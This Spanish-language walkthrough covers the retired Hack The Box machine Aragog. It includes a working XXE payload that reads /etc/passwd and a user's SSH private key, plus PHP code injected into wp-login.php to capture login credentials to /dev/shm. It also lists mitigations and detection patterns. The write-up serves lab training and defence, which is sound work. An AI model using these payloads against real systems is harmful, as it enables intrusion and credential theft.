---
machine: Aragog
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, ftp, xxe, wordpress, privesc]
---

# Aragog — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El FTP permite login anónimo y entrega un XML de ejemplo que revela el formato aceptado por `hosts.php`. La página es vulnerable a XXE in-band: permite leer `/etc/passwd` y la clave privada SSH de `florian`. Ya como `florian`, un WordPress interno se restaura cada cinco minutos desde un backup de root; `pspy` muestra un script que inicia sesión en WordPress y modificando `wp-login.php` se capturan sus credenciales, que también sirven para `root`.

## Reconocimiento

```bash
nmap -Pn -sCV -p21,22,80 <IP>
```

- `21` vsftpd 3.0.3 con login anónimo.
- `22` OpenSSH 7.2p2 sobre Ubuntu 16.04.
- `80` Apache 2.4.18; la raíz muestra la página por defecto.

La máquina fue reworked: hoy el sitio principal redirige a `aragog.htb`, así que el nombre debe añadirse a `/etc/hosts` y usarse en las peticiones web.

## Enumeración

```bash
ftp <IP>
# usuario: anonymous
ls
get test.txt
```

`test.txt` contiene una máscara de subred en XML:

```xml
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```

`gobuster` descubre `hosts.php`. Al enviar el XML con `curl`, la página calcula el número de hosts y refleja el contenido:

```bash
curl -X POST --data-binary @test.txt http://aragog.htb/hosts.php
```

## Foothold

El campo `subnet_mask` se procesa como XML sin deshabilitar entidades externas. Se define una entidad `SYSTEM` apuntando a un archivo local y se coloca dentro del nodo:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/florian/.ssh/id_rsa">
]>
<details>
  <subnet_mask>&xxe;</subnet_mask>
  <test></test>
</details>
```

```bash
curl -s -X POST --data-binary @exploit.xml http://aragog.htb/hosts.php
```

La respuesta incluye la clave privada de `florian`. Se guarda con permisos `600` y se usa para entrar por SSH:

```bash
chmod 600 id_rsa_florian
ssh -i id_rsa_florian florian@aragog.htb
```

La misma técnica permite leer `/etc/passwd` y confirmar los usuarios `florian` y `cliff`.

## Movimiento lateral

No es necesario: `florian` ya está en el host. En `/var/www/html` aparece `dev_wiki`, una instalación de WordPress, junto a `zz_backup` y `hosts.php`.

## Escalada de privilegios

`pspy` revela dos tareas periódicas:

- cada minuto, `cliff` ejecuta `/home/cliff/wp-login.py`;
- cada cinco minutos, root ejecuta `/root/restore.sh`, que borra `dev_wiki`, lo copia desde `zz_backup` y lo deja escribible.

El script de `cliff` inicia sesión en WordPress. Como `wp-login.php` es escribible, se añade código que guarda los parámetros recibidos:

```php
<?php
$rrr = print_r($_REQUEST, true);
$fff = fopen("/dev/shm/df", "a");
fwrite($fff, $rrr);
fclose($fff);
```

Tras esperar al cron, `/dev/shm/df` contiene el usuario y la contraseña del administrador de WordPress. Esa contraseña también funciona para `root`:

```bash
su
# introducir la contraseña capturada
id
```

## Evidencia

- `test.txt` descargado por FTP anónimo.
- Respuesta de `hosts.php` con el contenido de `/etc/lsb-release` y de la clave de `florian`.
- `pspy` mostrando `restore.sh` y `wp-login.py`.
- `/dev/shm/df` con la petición de login capturada.
- `id` como root.

## Lecciones aprendidas

- Un archivo de ejemplo en un servicio de solo lectura puede describir el formato que espera una aplicación vulnerable.
- XXE in-band es suficiente cuando la respuesta refleja la entidad; no siempre hace falta un canal out-of-band.
- Los backups automáticos y los scripts de login son una fuente de credenciales y de escrituras controladas por root.
- `pspy` permite ver cron y procesos efímeros sin acceso a `crontab`.

## Mitigaciones y detección

- Deshabilitar entidades externas y DTD en el parser XML (`LIBXML_NOENT` fuera, `resolve_entities=false`).
- Validar la máscara como una dirección IPv4 y no devolver la entrada sin escapar.
- No guardar credenciales en scripts ni reutilizar la contraseña de WordPress para root.
- Restaurar backups desde una copia de solo lectura y no hacer escribible todo el árbol web.
- Detectar peticiones a `hosts.php` con `<!DOCTYPE`, `SYSTEM` o `file://`, y procesos cron que lean o escriban en `/dev/shm`.

## Referencias

- [0xdf — Aragog](https://0xdf.gitlab.io/2018/07/21/htb-aragog.html)
- [IppSec — Aragog](https://www.youtube.com/watch?v=NFdi-2tgvxY)
- [Hack The Box — Aragog](https://app.hackthebox.com/machines/aragog)
